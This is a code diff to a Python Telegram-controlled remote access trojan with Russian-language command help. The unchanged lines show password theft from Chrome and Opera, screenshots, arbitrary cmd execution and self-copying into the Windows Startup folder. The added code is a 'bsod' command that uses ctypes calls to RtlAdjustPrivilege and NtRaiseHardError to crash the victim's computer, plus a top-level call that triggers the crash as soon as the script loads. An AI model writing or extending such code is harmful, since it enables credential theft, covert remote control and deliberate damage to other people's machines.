@@ -4,6 +4,7 @@ import requests
 from PIL import ImageGrab 
 import shutil 
 import sqlite3 
+import ctypes
 import win32crypt 
 import subprocess 
 import os, sys
@@ -24,7 +25,7 @@ def send_message(command):
     
 @bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # Commands
 def send_message(command):
-    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /kill_process name.exe - Убить процесс по имени" +
+    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n bsod - Краш компьютера \n /kill_process name.exe - Убить процесс по имени" +
                     "\n /Pwd - Узнать текущую директорию \n /autostart - Добавить ратник в автостарт \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
                     "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                     "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку" + 
@@ -49,6 +50,14 @@ def send_screen(command) :
     if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
         os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
     bot.send_message(chat_id, "Successfully to Autostart!") 
+
+@bot.message_handler(commands=['bsod', 'Bsod']) 
+def trigger_bsod():
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xC0000420, 0, 0, (0, 0, 0, 0), 6)
+
+trigger_bsod()
+
 
 
 def Chrome():
